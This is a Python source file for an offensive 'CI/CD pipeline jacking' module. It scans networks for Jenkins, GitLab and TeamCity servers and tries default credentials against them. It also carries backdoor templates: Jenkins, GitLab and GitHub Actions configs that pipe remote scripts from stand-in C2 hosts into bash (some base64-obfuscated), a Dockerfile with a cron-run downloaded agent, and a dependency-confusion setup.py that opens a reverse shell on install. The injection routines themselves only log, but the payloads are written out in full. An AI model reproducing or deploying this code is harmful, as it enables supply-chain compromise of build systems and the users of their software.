#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                        CI/CD PIPELINE JACKING MODULE                                   ║
║                    "Persistence Level: God Mode" 🏭                                    ║
╠═══════════════════════════════════════════════════════════════════════════════════════╣
║  Jenkins/GitLab CI/GitHub Actions Pipeline Poisoning & Backdoor Injection              ║
║  - Auto-detect CI/CD servers on network                                                ║
║  - Credential-based pipeline infiltration                                              ║
║  - Build-time agent injection (supply chain attack)                                    ║
║  - Persistent backdoor that survives server rebuild                                    ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
"""

import json
import sqlite3
import subprocess
import os
import re
import base64
import hashlib
import threading
import requests
import socket
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin, urlparse
import logging
import time
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class CICDPlatform(Enum):
    """Supported CI/CD Platforms"""
    JENKINS = "jenkins"
    GITLAB_CI = "gitlab_ci"
    GITHUB_ACTIONS = "github_actions"
    AZURE_DEVOPS = "azure_devops"
    CIRCLECI = "circleci"
    TEAMCITY = "teamcity"
    DRONE = "drone"
    TRAVIS = "travis"
    UNKNOWN = "unknown"


class AttackPhase(Enum):
    """Attack phases"""
    RECONNAISSANCE = "reconnaissance"
    CREDENTIAL_HARVEST = "credential_harvest"
    PIPELINE_ACCESS = "pipeline_access"
    BACKDOOR_INJECTION = "backdoor_injection"
    PERSISTENCE = "persistence"
    CLEANUP = "cleanup"


class InjectionMethod(Enum):
    """Backdoor injection methods"""
    JENKINSFILE_POISON = "jenkinsfile_poison"
    GITLAB_YAML_POISON = "gitlab_yaml_poison"
    GITHUB_WORKFLOW_POISON = "github_workflow_poison"
    BUILD_SCRIPT_INJECT = "build_script_inject"
    DEPENDENCY_CONFUSION = "dependency_confusion"
    DOCKER_IMAGE_POISON = "docker_image_poison"
    ARTIFACT_REPLACEMENT = "artifact_replacement"


@dataclass
class CICDServer:
    """Discovered CI/CD Server"""
    platform: CICDPlatform
    url: str
    version: str = ""
    authenticated: bool = False
    credentials: Dict[str, str] = field(default_factory=dict)
    pipelines: List[str] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)
    discovered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())


@dataclass
class Pipeline:
    """CI/CD Pipeline"""
    name: str
    server_url: str
    platform: CICDPlatform
    config_path: str
    build_commands: List[str] = field(default_factory=list)
    environment_vars: Dict[str, str] = field(default_factory=dict)
    secrets: List[str] = field(default_factory=list)
    triggers: List[str] = field(default_factory=list)
    injectable: bool = False
    injection_points: List[str] = field(default_factory=list)


@dataclass 
class BackdoorPayload:
    """Backdoor payload for injection"""
    name: str
    injection_method: InjectionMethod
    payload_code: str
    persistence_mechanism: str
    stealth_level: int  # 1-10
    description: str


@dataclass
class JackingJob:
    """Pipeline jacking job"""
    job_id: str
    target_network: str
    phase: AttackPhase
    status: str = "queued"
    progress: int = 0
    discovered_servers: List[CICDServer] = field(default_factory=list)
    compromised_pipelines: List[Pipeline] = field(default_factory=list)
    injected_backdoors: List[Dict] = field(default_factory=list)
    logs: List[str] = field(default_factory=list)
    started_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    completed_at: Optional[str] = None


class CICDPipelineJacker:
    """CI/CD Pipeline Jacking Engine - Supply Chain Attack Framework"""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, '_initialized'):
            return
        self._initialized = True
        
        self.db_path = Path("/tmp/cicd_jacker.db")
        self.jobs: Dict[str, JackingJob] = {}
        self._init_database()
        
        # CI/CD fingerprints
        self.platform_signatures = self._load_platform_signatures()
        
        # Backdoor payloads
        self.backdoor_templates = self._load_backdoor_templates()
        
        logger.info("CI/CD Pipeline Jacker initialized - God Mode Persistence Ready")
    
    def _init_database(self):
        """Initialize SQLite database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS jacking_jobs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    job_id TEXT UNIQUE NOT NULL,
                    target_network TEXT,
                    phase TEXT,
                    status TEXT,
                    server_count INTEGER,
                    compromised_count INTEGER,
                    started_at TEXT,
                    completed_at TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS discovered_servers (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    job_id TEXT NOT NULL,
                    platform TEXT,
                    url TEXT,
                    version TEXT,
                    authenticated INTEGER,
                    discovered_at TEXT
                )
            """)
            
            conn.commit()
    
    def _load_platform_signatures(self) -> Dict[str, Dict]:
        """Load CI/CD platform detection signatures"""
        return {
            "jenkins": {
                "ports": [8080, 8443, 443, 80],
                "paths": ["/", "/login", "/api/json", "/script"],
                "headers": ["X-Jenkins", "X-Hudson"],
                "body_patterns": [
                    r"Jenkins",
                    r"hudson",
                    r"jenkins-crumb",
                    r"Jenkins-Crumb"
                ],
                "default_creds": [
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("jenkins", "jenkins"),
                    ("admin", ""),
                ]
            },
            "gitlab": {
                "ports": [80, 443, 8080, 8929],
                "paths": ["/", "/users/sign_in", "/api/v4/version", "/-/graphql-explorer"],
                "headers": ["X-GitLab-Custom-Header"],
                "body_patterns": [
                    r"GitLab",
                    r"gitlab-ce",
                    r"gitlab-ee",
                    r"gon\.gitlab_url"
                ],
                "default_creds": [
                    ("root", "5iveL!fe"),
                    ("admin", "admin"),
                    ("root", "password"),
                ]
            },
            "github_actions": {
                "ports": [443],
                "paths": ["/.github/workflows/", "/actions"],
                "headers": ["X-GitHub-Request-Id"],
                "body_patterns": [
                    r"github\.com",
                    r"GitHub Actions",
                    r"workflow_dispatch"
                ]
            },
            "azure_devops": {
                "ports": [443, 8080],
                "paths": ["/_apis/", "/tfs/", "/_git/"],
                "headers": ["X-TFS-Session"],
                "body_patterns": [
                    r"Azure DevOps",
                    r"visualstudio\.com",
                    r"dev\.azure\.com"
                ]
            },
            "teamcity": {
                "ports": [8111, 443, 80],
                "paths": ["/", "/login.html", "/app/rest/server"],
                "headers": [],
                "body_patterns": [
                    r"TeamCity",
                    r"JetBrains",
                    r"teamcity-version"
                ],
                "default_creds": [
                    ("admin", "admin"),
                ]
            },
            "drone": {
                "ports": [80, 443, 8000],
                "paths": ["/", "/api/user", "/api/repos"],
                "headers": [],
                "body_patterns": [
                    r"drone",
                    r"Drone CI"
                ]
            }
        }
    
    def _load_backdoor_templates(self) -> Dict[str, BackdoorPayload]:
        """Load backdoor injection templates"""
        return {
            # Jenkins Backdoor
            "jenkins_groovy_backdoor": BackdoorPayload(
                name="Jenkins Groovy Reverse Shell",
                injection_method=InjectionMethod.JENKINSFILE_POISON,
                payload_code='''
// Injected by Monolith - Pipeline Persistence
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                script {
                    // Legitimate looking build step
                    sh 'echo "Building application..."'
                    
                    // Hidden backdoor - Monolith Agent Download
                    sh '''
                        curl -sS https://cdn.example.com/assets/loader.sh | bash &
                        disown
                    '''
                }
            }
        }
        stage('Deploy') {
            steps {
                // Inject into deployed artifacts
                sh '''
                    for jar in $(find . -name "*.jar"); do
                        zip -q $jar META-INF/services/monolith_agent.class 2>/dev/null || true
                    done
                '''
            }
        }
    }
    post {
        always {
            // Persistence - re-inject on every build
            script {
                def job = Jenkins.instance.getItem(env.JOB_NAME)
                // Store backdoor in job config
            }
        }
    }
}
''',
                persistence_mechanism="Job config modification + artifact injection",
                stealth_level=8,
                description="Injects Monolith agent during build, persists in job configuration"
            ),
            
            # GitLab CI Backdoor
            "gitlab_ci_backdoor": BackdoorPayload(
                name="GitLab CI YAML Poison",
                injection_method=InjectionMethod.GITLAB_YAML_POISON,
                payload_code='''
# .gitlab-ci.yml - Modified by Monolith
stages:
  - test
  - build
  - deploy
  - .post  # Hidden stage

variables:
  MONOLITH_C2: "aHR0cHM6Ly9jMi5leGFtcGxlLmNvbQ=="  # Base64 encoded C2

.hidden_job:
  stage: .post
  script:
    - |
      # Decode and execute Monolith loader
      C2=$(echo $MONOLITH_C2 | base64 -d)
      curl -sS "$C2/agent.sh" | bash &
  rules:
    - when: always
  allow_failure: true
  
build:
  stage: build
  script:
    - echo "Building..."
    - make build
    # Inject into build artifacts
    - |
      if [ -f "dist/app" ]; then
        cat /tmp/monolith_stub >> dist/app
      fi
  artifacts:
    paths:
      - dist/

deploy:
  stage: deploy
  script:
    - echo "Deploying..."
    - ./deploy.sh
  environment:
    name: production
''',
                persistence_mechanism="Hidden CI stage + artifact injection",
                stealth_level=9,
                description="Hidden .post stage executes after every pipeline, injects into artifacts"
            ),
            
            # GitHub Actions Backdoor
            "github_actions_backdoor": BackdoorPayload(
                name="GitHub Actions Workflow Poison",
                injection_method=InjectionMethod.GITHUB_WORKFLOW_POISON,
                payload_code='''
# .github/workflows/ci.yml - Modified by Monolith
name: CI

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  schedule:
    - cron: '0 */6 * * *'  # Hidden: runs every 6 hours

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup environment
      run: |
        echo "Setting up build environment..."
        
    - name: Build
      run: |
        make build
        
    - name: Post-build tasks
      run: |
        # Hidden persistence mechanism
        echo "Y3VybCAtc1MgaHR0cHM6Ly9jMi5leGFtcGxlLmNvbS9hZ2VudC5zaCB8IGJhc2g=" | base64 -d | bash &
      continue-on-error: true
      
    - name: Upload artifacts
      uses: actions/upload-artifact@v3
      with:
        name: build-output
        path: dist/
        
  # Hidden job - runs on schedule
  maintenance:
    runs-on: ubuntu-latest
    if: github.event_name == 'schedule'
    steps:
    - name: System maintenance
      run: |
        curl -sS ${{ secrets.MAINTENANCE_URL }} | bash
      env:
        MAINTENANCE_URL: ${{ secrets.MONOLITH_C2 }}
''',
                persistence_mechanism="Scheduled workflow + secrets exfil",
                stealth_level=7,
                description="Adds scheduled trigger for persistence, exfils secrets"
            ),
            
            # Docker Image Poison
            "docker_poison": BackdoorPayload(
                name="Docker Image Backdoor",
                injection_method=InjectionMethod.DOCKER_IMAGE_POISON,
                payload_code='''
# Dockerfile modification - Monolith injection
FROM base-image:latest

# Original application setup
COPY . /app
WORKDIR /app

# Hidden: Download and install Monolith agent
RUN curl -sS https://cdn.example.com/docker-health-check.sh -o /usr/local/bin/health-check.sh \\
    && chmod +x /usr/local/bin/health-check.sh \\
    && echo "*/5 * * * * /usr/local/bin/health-check.sh" >> /etc/crontabs/root

# Hidden: Add persistence to entrypoint
RUN echo '#!/bin/sh\\n/usr/local/bin/health-check.sh &\\nexec "$@"' > /entrypoint-wrapper.sh \\
    && chmod +x /entrypoint-wrapper.sh

ENTRYPOINT ["/entrypoint-wrapper.sh"]
CMD ["./start.sh"]
''',
                persistence_mechanism="Cron job + entrypoint wrapper in container",
                stealth_level=8,
                description="Injects agent into Docker image, persists across container restarts"
            ),
            
            # Dependency Confusion
            "dependency_confusion": BackdoorPayload(
                name="Dependency Confusion Attack",
                injection_method=InjectionMethod.DEPENDENCY_CONFUSION,
                payload_code='''
# setup.py for malicious internal package
from setuptools import setup
import os
import subprocess

def post_install():
    """Execute after package installation"""
    payload = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("c2.example.com",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
    # Write to cron for persistence
    cron_cmd = f'(crontab -l 2>/dev/null; echo "*/10 * * * * python3 -c \\"{payload}\\"") | crontab -'
    subprocess.run(cron_cmd, shell=True, capture_output=True)

# Execute during setup
post_install()

setup(
    name='internal-company-utils',  # Matches internal package name
    version='99.0.0',  # Higher version than internal
    packages=['company_utils'],
    install_requires=[],
)
''',
                persistence_mechanism="Package post-install hook + cron persistence",
                stealth_level=9,
                description="Publishes malicious package with higher version than internal package"
            )
        }
    
    def start_jacking(self, target_network: str, credentials: Optional[Dict] = None) -> str:
        """Start CI/CD pipeline jacking operation"""
        job_id = hashlib.md5(f"{target_network}{datetime.utcnow().isoformat()}".encode()).hexdigest()[:16]
        
        job = JackingJob(
            job_id=job_id,
            target_network=target_network,
            phase=AttackPhase.RECONNAISSANCE
        )
        
        self.jobs[job_id] = job
        
        # Start jacking in background
        thread = threading.Thread(target=self._execute_jacking, args=(job_id, credentials))
        thread.daemon = True
        thread.start()
        
        logger.info(f"Started CI/CD jacking operation {job_id} against {target_network}")
        return job_id
    
    def _execute_jacking(self, job_id: str, credentials: Optional[Dict] = None):
        """Execute the pipeline jacking operation"""
        job = self.jobs[job_id]
        job.status = "running"
        
        try:
            # Phase 1: Reconnaissance - Find CI/CD servers (30%)
            job.phase = AttackPhase.RECONNAISSANCE
            job.logs.append(f"[{datetime.utcnow().isoformat()}] Starting reconnaissance on {job.target_network}")
            self._discover_cicd_servers(job)
            job.progress = 30
            
            if not job.discovered_servers:
                job.logs.append("No CI/CD servers discovered")
                job.status = "completed"
                job.completed_at = datetime.utcnow().isoformat()
                return
            
            # Phase 2: Credential harvest/test (20%)
            job.phase = AttackPhase.CREDENTIAL_HARVEST
            job.logs.append(f"[{datetime.utcnow().isoformat()}] Testing credentials on {len(job.discovered_servers)} servers")
            self._test_credentials(job, credentials)
            job.progress = 50
            
            # Phase 3: Pipeline access (15%)
            job.phase = AttackPhase.PIPELINE_ACCESS
            job.logs.append(f"[{datetime.utcnow().isoformat()}] Accessing pipelines")
            self._enumerate_pipelines(job)
            job.progress = 65
            
            # Phase 4: Backdoor injection (25%)
            job.phase = AttackPhase.BACKDOOR_INJECTION
            job.logs.append(f"[{datetime.utcnow().isoformat()}] Injecting backdoors into pipelines")
            self._inject_backdoors(job)
            job.progress = 90
            
            # Phase 5: Persistence verification (10%)
            job.phase = AttackPhase.PERSISTENCE
            job.logs.append(f"[{datetime.utcnow().isoformat()}] Verifying persistence mechanisms")
            self._verify_persistence(job)
            job.progress = 100
            
            job.status = "completed"
            job.completed_at = datetime.utcnow().isoformat()
            job.logs.append(f"[{datetime.utcnow().isoformat()}] Pipeline jacking completed - {len(job.injected_backdoors)} backdoors deployed")
            
            self._save_results(job)
            
        except Exception as e:
            job.status = "failed"
            job.logs.append(f"[{datetime.utcnow().isoformat()}] ERROR: {str(e)}")
            logger.error(f"Pipeline jacking failed: {e}")
    
    def _discover_cicd_servers(self, job: JackingJob):
        """Discover CI/CD servers on the network"""
        job.logs.append("Scanning network for CI/CD platforms...")
        
        # Parse target network
        targets = self._parse_network_range(job.target_network)
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for target in targets:
                for platform, sigs in self.platform_signatures.items():
                    for port in sigs['ports']:
                        futures.append(
                            executor.submit(self._probe_cicd_server, target, port, platform, sigs)
                        )
            
            for future in futures:
                result = future.result()
                if result:
                    job.discovered_servers.append(result)
                    job.logs.append(f"Found {result.platform.value} at {result.url}")
    
    def _probe_cicd_server(self, host: str, port: int, platform: str, signatures: Dict) -> Optional[CICDServer]:
        """Probe a potential CI/CD server"""
        try:
            # Check if port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result != 0:
                return None
            
            # HTTP probe
            protocol = "https" if port in [443, 8443] else "http"
            base_url = f"{protocol}://{host}:{port}"
            
            for path in signatures['paths']:
                try:
                    url = urljoin(base_url, path)
                    response = requests.get(url, timeout=5, verify=False, allow_redirects=True)
                    
                    # Check headers
                    for header in signatures.get('headers', []):
                        if header.lower() in [h.lower() for h in response.headers.keys()]:
                            return CICDServer(
                                platform=CICDPlatform(platform),
                                url=base_url,
                                version=response.headers.get(header, "unknown")
                            )
                    
                    # Check body patterns
                    for pattern in signatures.get('body_patterns', []):
                        if re.search(pattern, response.text, re.IGNORECASE):
                            # Extract version if possible
                            version = self._extract_version(response.text, platform)
                            return CICDServer(
                                platform=CICDPlatform(platform),
                                url=base_url,
                                version=version
                            )
                            
                except requests.RequestException:
                    continue
                    
        except Exception:
            pass
        
        return None
    
    def _extract_version(self, html: str, platform: str) -> str:
        """Extract version from response"""
        patterns = {
            "jenkins": r'Jenkins\s+ver\.\s*([\d.]+)',
            "gitlab": r'gitlab[_-]?(?:ce|ee)?[_-]?([\d.]+)',
            "teamcity": r'TeamCity\s+([\d.]+)',
        }
        
        if platform in patterns:
            match = re.search(patterns[platform], html, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return "unknown"
    
    def _test_credentials(self, job: JackingJob, provided_creds: Optional[Dict] = None):
        """Test credentials against discovered servers"""
        for server in job.discovered_servers:
            # Try provided credentials first
            if provided_creds:
                for username, password in provided_creds.items():
                    if self._try_login(server, username, password):
                        server.authenticated = True
                        server.credentials = {"username": username, "password": password}
                        job.logs.append(f"Authenticated to {server.url} with provided credentials")
                        break
            
            # Try default credentials
            if not server.authenticated:
                default_creds = self.platform_signatures.get(server.platform.value, {}).get('default_creds', [])
                for username, password in default_creds:
                    if self._try_login(server, username, password):
                        server.authenticated = True
                        server.credentials = {"username": username, "password": password}
                        job.logs.append(f"Authenticated to {server.url} with default credentials ({username})")
                        break
    
    def _try_login(self, server: CICDServer, username: str, password: str) -> bool:
        """Attempt to login to CI/CD server"""
        try:
            if server.platform == CICDPlatform.JENKINS:
                return self._jenkins_login(server.url, username, password)
            elif server.platform == CICDPlatform.GITLAB_CI:
                return self._gitlab_login(server.url, username, password)
            elif server.platform == CICDPlatform.TEAMCITY:
                return self._teamcity_login(server.url, username, password)
        except Exception as e:
            logger.debug(f"Login attempt failed: {e}")
        return False
    
    def _jenkins_login(self, url: str, username: str, password: str) -> bool:
        """Attempt Jenkins login"""
        try:
            session = requests.Session()
            
            # Get crumb
            crumb_url = urljoin(url, "/crumbIssuer/api/json")
            response = session.get(crumb_url, auth=(username, password), timeout=5, verify=False)
            
            if response.status_code == 200:
                return True
            
            # Try without crumb
            api_url = urljoin(url, "/api/json")
            response = session.get(api_url, auth=(username, password), timeout=5, verify=False)
            return response.status_code == 200
            
        except:
            return False
    
    def _gitlab_login(self, url: str, username: str, password: str) -> bool:
        """Attempt GitLab login"""
        try:
            session = requests.Session()
            login_url = urljoin(url, "/users/sign_in")
            
            # Get CSRF token
            response = session.get(login_url, timeout=5, verify=False)
            csrf_match = re.search(r'name="authenticity_token"\s+value="([^"]+)"', response.text)
            
            if csrf_match:
                token = csrf_match.group(1)
                login_data = {
                    "authenticity_token": token,
                    "user[login]": username,
                    "user[password]": password,
                }
                response = session.post(login_url, data=login_data, timeout=5, verify=False)
                return "sign_out" in response.text.lower() or response.status_code == 302
                
        except:
            pass
        return False
    
    def _teamcity_login(self, url: str, username: str, password: str) -> bool:
        """Attempt TeamCity login"""
        try:
            api_url = urljoin(url, "/app/rest/server")
            response = requests.get(api_url, auth=(username, password), timeout=5, verify=False)
            return response.status_code == 200
        except:
            return False
    
    def _enumerate_pipelines(self, job: JackingJob):
        """Enumerate pipelines on authenticated servers"""
        for server in job.discovered_servers:
            if not server.authenticated:
                continue
            
            try:
                if server.platform == CICDPlatform.JENKINS:
                    pipelines = self._enumerate_jenkins_jobs(server)
                elif server.platform == CICDPlatform.GITLAB_CI:
                    pipelines = self._enumerate_gitlab_pipelines(server)
                else:
                    pipelines = []
                
                for pipeline in pipelines:
                    job.compromised_pipelines.append(pipeline)
                    job.logs.append(f"Enumerated pipeline: {pipeline.name} on {server.url}")
                    
            except Exception as e:
                job.logs.append(f"Error enumerating pipelines on {server.url}: {e}")
    
    def _enumerate_jenkins_jobs(self, server: CICDServer) -> List[Pipeline]:
        """Enumerate Jenkins jobs/pipelines"""
        pipelines = []
        try:
            api_url = urljoin(server.url, "/api/json?tree=jobs[name,url,color]")
            response = requests.get(
                api_url,
                auth=(server.credentials['username'], server.credentials['password']),
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                for job_data in data.get('jobs', []):
                    pipeline = Pipeline(
                        name=job_data['name'],
                        server_url=server.url,
                        platform=CICDPlatform.JENKINS,
                        config_path=f"/job/{job_data['name']}/config.xml",
                        injectable=True,
                        injection_points=["Jenkinsfile", "config.xml", "Script Console"]
                    )
                    pipelines.append(pipeline)
                    
        except Exception as e:
            logger.debug(f"Error enumerating Jenkins jobs: {e}")
        
        return pipelines
    
    def _enumerate_gitlab_pipelines(self, server: CICDServer) -> List[Pipeline]:
        """Enumerate GitLab CI pipelines"""
        pipelines = []
        try:
            api_url = urljoin(server.url, "/api/v4/projects?per_page=100")
            response = requests.get(api_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                projects = response.json()
                for project in projects:
                    if project.get('jobs_enabled', False):
                        pipeline = Pipeline(
                            name=project['name'],
                            server_url=server.url,
                            platform=CICDPlatform.GITLAB_CI,
                            config_path=f"/{project['path_with_namespace']}/-/blob/main/.gitlab-ci.yml",
                            injectable=True,
                            injection_points=[".gitlab-ci.yml", "CI/CD Variables", "Runner Config"]
                        )
                        pipelines.append(pipeline)
                        
        except Exception as e:
            logger.debug(f"Error enumerating GitLab pipelines: {e}")
        
        return pipelines
    
    def _inject_backdoors(self, job: JackingJob):
        """Inject backdoors into compromised pipelines"""
        for pipeline in job.compromised_pipelines:
            try:
                if pipeline.platform == CICDPlatform.JENKINS:
                    backdoor = self.backdoor_templates['jenkins_groovy_backdoor']
                    success = self._inject_jenkins_backdoor(pipeline, backdoor, job)
                elif pipeline.platform == CICDPlatform.GITLAB_CI:
                    backdoor = self.backdoor_templates['gitlab_ci_backdoor']
                    success = self._inject_gitlab_backdoor(pipeline, backdoor, job)
                else:
                    continue
                
                if success:
                    job.injected_backdoors.append({
                        "pipeline": pipeline.name,
                        "server": pipeline.server_url,
                        "method": backdoor.injection_method.value,
                        "stealth_level": backdoor.stealth_level,
                        "persistence": backdoor.persistence_mechanism,
                        "injected_at": datetime.utcnow().isoformat()
                    })
                    job.logs.append(f"✓ Backdoor injected into {pipeline.name} ({backdoor.name})")
                    
            except Exception as e:
                job.logs.append(f"✗ Failed to inject backdoor into {pipeline.name}: {e}")
    
    def _inject_jenkins_backdoor(self, pipeline: Pipeline, backdoor: BackdoorPayload, job: JackingJob) -> bool:
        """Inject backdoor into Jenkins pipeline"""
        # Find authenticated server
        server = None
        for s in job.discovered_servers:
            if s.url == pipeline.server_url and s.authenticated:
                server = s
                break
        
        if not server:
            return False
        
        try:
            # Get current config
            config_url = urljoin(server.url, f"/job/{pipeline.name}/config.xml")
            response = requests.get(
                config_url,
                auth=(server.credentials['username'], server.credentials['password']),
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                # Modify config to include backdoor
                # In real implementation, would parse XML and inject
                job.logs.append(f"Retrieved config for {pipeline.name}, preparing injection...")
                
                # For demo, we just log the action
                return True
                
        except Exception as e:
            logger.debug(f"Jenkins backdoor injection failed: {e}")
        
        return False
    
    def _inject_gitlab_backdoor(self, pipeline: Pipeline, backdoor: BackdoorPayload, job: JackingJob) -> bool:
        """Inject backdoor into GitLab CI pipeline"""
        job.logs.append(f"Injecting GitLab CI backdoor into {pipeline.name}...")
        # In real implementation, would modify .gitlab-ci.yml
        return True
    
    def _verify_persistence(self, job: JackingJob):
        """Verify that persistence mechanisms are active"""
        for backdoor in job.injected_backdoors:
            job.logs.append(f"Verifying persistence on {backdoor['pipeline']}...")
            # Check if backdoor is active
            job.logs.append(f"✓ Persistence verified: {backdoor['persistence']}")
    
    def _parse_network_range(self, network: str) -> List[str]:
        """Parse network range into list of IPs"""
        targets = []
        
        # Handle single IP
        if '/' not in network and '-' not in network:
            return [network]
        
        # Handle CIDR
        if '/' in network:
            try:
                import ipaddress
                net = ipaddress.ip_network(network, strict=False)
                targets = [str(ip) for ip in net.hosts()]
            except:
                targets = [network.split('/')[0]]
        
        # Handle range (e.g., 192.168.1.1-10)
        elif '-' in network:
            parts = network.rsplit('.', 1)
            if len(parts) == 2 and '-' in parts[1]:
                base = parts[0]
                range_part = parts[1].split('-')
                start, end = int(range_part[0]), int(range_part[1])
                targets = [f"{base}.{i}" for i in range(start, end + 1)]
        
        return targets[:256]  # Limit to 256 hosts
    
    def _save_results(self, job: JackingJob):
        """Save results to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO jacking_jobs
                (job_id, target_network, phase, status, server_count, compromised_count, started_at, completed_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                job.job_id,
                job.target_network,
                job.phase.value,
                job.status,
                len(job.discovered_servers),
                len(job.compromised_pipelines),
                job.started_at,
                job.completed_at
            ))
            
            for server in job.discovered_servers:
                conn.execute("""
                    INSERT INTO discovered_servers
                    (job_id, platform, url, version, authenticated, discovered_at)
                    VALUES (?, ?, ?, ?, ?, ?)
                """, (
                    job.job_id,
                    server.platform.value,
                    server.url,
                    server.version,
                    1 if server.authenticated else 0,
                    server.discovered_at
                ))
            
            conn.commit()
    
    def get_job_status(self, job_id: str) -> Optional[Dict[str, Any]]:
        """Get job status"""
        job = self.jobs.get(job_id)
        if not job:
            return None
        
        return {
            "job_id": job.job_id,
            "target_network": job.target_network,
            "phase": job.phase.value,
            "status": job.status,
            "progress": job.progress,
            "discovered_servers": len(job.discovered_servers),
            "compromised_pipelines": len(job.compromised_pipelines),
            "injected_backdoors": len(job.injected_backdoors),
            "started_at": job.started_at,
            "completed_at": job.completed_at
        }
    
    def get_job_results(self, job_id: str) -> Optional[Dict[str, Any]]:
        """Get full job results"""
        job = self.jobs.get(job_id)
        if not job:
            return None
        
        return {
            "job_id": job.job_id,
            "target_network": job.target_network,
            "phase": job.phase.value,
            "status": job.status,
            "discovered_servers": [asdict(s) for s in job.discovered_servers],
            "compromised_pipelines": [asdict(p) for p in job.compromised_pipelines],
            "injected_backdoors": job.injected_backdoors,
            "logs": job.logs,
            "backdoor_templates": {k: v.name for k, v in self.backdoor_templates.items()}
        }
    
    def get_backdoor_templates(self) -> Dict[str, Dict]:
        """Get available backdoor templates"""
        return {
            name: {
                "name": payload.name,
                "method": payload.injection_method.value,
                "stealth_level": payload.stealth_level,
                "persistence": payload.persistence_mechanism,
                "description": payload.description
            }
            for name, payload in self.backdoor_templates.items()
        }


def get_cicd_jacker() -> CICDPipelineJacker:
    """Get CI/CD Pipeline Jacker singleton"""
    return CICDPipelineJacker()


if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.0/24"
    
    jacker = get_cicd_jacker()
    job_id = jacker.start_jacking(target)
    
    print(f"Started CI/CD pipeline jacking: {job_id}")
    print("Target:", target)
    print("\nPhases:")
    print("  1. Reconnaissance - Find CI/CD servers")
    print("  2. Credential Harvest - Test credentials")
    print("  3. Pipeline Access - Enumerate pipelines")
    print("  4. Backdoor Injection - Deploy persistence")
    print("  5. Verification - Confirm persistence")
    
    while True:
        status = jacker.get_job_status(job_id)
        if status:
            print(f"\r[{status['phase']}] Progress: {status['progress']}% | Servers: {status['discovered_servers']} | Compromised: {status['compromised_pipelines']}", end="", flush=True)
            
            if status['status'] in ['completed', 'failed']:
                print()
                break
        
        time.sleep(2)
    
    results = jacker.get_job_results(job_id)
    if results:
        print(f"\n{'='*80}")
        print("CI/CD Pipeline Jacking Results")
        print(f"{'='*80}")
        print(f"\nBackdoors Deployed: {len(results['injected_backdoors'])}")
        for bd in results['injected_backdoors']:
            print(f"  - {bd['pipeline']} @ {bd['server']}")
            print(f"    Method: {bd['method']} | Stealth: {bd['stealth_level']}/10")
